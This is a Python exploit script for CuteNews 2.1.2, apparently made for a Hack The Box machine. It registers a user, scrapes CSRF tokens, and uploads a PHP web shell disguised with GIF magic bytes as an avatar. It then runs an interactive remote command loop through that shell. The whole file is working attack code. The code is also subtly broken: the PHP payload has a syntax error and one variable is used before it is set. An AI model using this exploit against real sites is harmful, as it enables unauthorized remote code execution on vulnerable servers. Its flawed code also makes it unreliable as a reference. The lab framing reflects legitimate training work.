# simple script for CuteNews 2.1.2, made for HTB passage


#! /bin/env python3

import requests
import sys
import os
from http.server import HTTPServer, CGIHTTPRequestHandler

## authentication
url = sys.argv[1]

proxies = {"http":"http://localhost:8080/"}


session = requests.Session()

session.proxies.update(proxies)

registerVars = { "action":"register", "regusername":"rekt","regnickname":"hoohaa","regpassword":"password","confirm":"password","regemail":"rekt1@gmail.com" }
regUrl = url + "/CuteNews/index.php?register"
regPost = session.post(regUrl, data=registerVars)

loginVars = {"action":"dologin","username":"rekt","password":"password"}
loginUrl = url + "/CuteNews/index.php"

if "Username already exists" in regPost.text:
    print("Already registered, logging in")
    loginPost = session.post(loginUrl, data=loginVars)
else:
    print("User registered, cookie set")

print(loginPost.text)



#payload creation, just a regular php file with GIF magig bytes

magicByte = "GIF8; "
payload = "<?php system($_GET['cmd'); ?>"

#getting anti CSRF tokens from avatar form

getSessionTokens = session.get(url + "/CuteNews/index.php?mod=main&opt=personal")

sessionText = (getSessionTokens.text)

sessionKey = sessionText.split("__signature_key")[1].split('"')
sessionDsi = sessionText.split("__signature_dsi")[1].split('"')

sigKey = sessionKey[2]
sigDsi = sessionDsi[2]

fileName = "monkey.php"

#setting up form parameters

files = {
        "mod" : (None, "main"),
        "opt" : (None, "personal"),
        "__signature_key" : (None, sigKey),
        "__signature_dsi" : (None, sigDsi),
        "editpassword" : (None, ""),
        "confirmpassword" : (None, ""),
        "editnickname" : (None, "hoohaa"),
        "avatar_file" : (fileName,magicByte + payload),
        "more[site]" : (None, ""),
        "more[about]" : (None, "")
    }



#sending request
session.post(url+"/CuteNews/index.php?mod=main&opt=personal",files=files)



#web shell communication 

print("Enter commands, quit or exit to stop : \n")

cmd = input("Command: ")

resp = session.get(url+"/CuteNews/uploads/avatar_rekt1_"+fileName+"?cmd=" + cmd)
print(resp.text.split('GIF8;')[1])

while cmd != "exit" and cmd != "quit":
    cmd = input("Command: ")
    resp = session.get(url+"/CuteNews/uploads/avatar_rekt1_"+fileName+"?cmd=" + cmd)
    print(resp.text.split('GIF8;')[1])




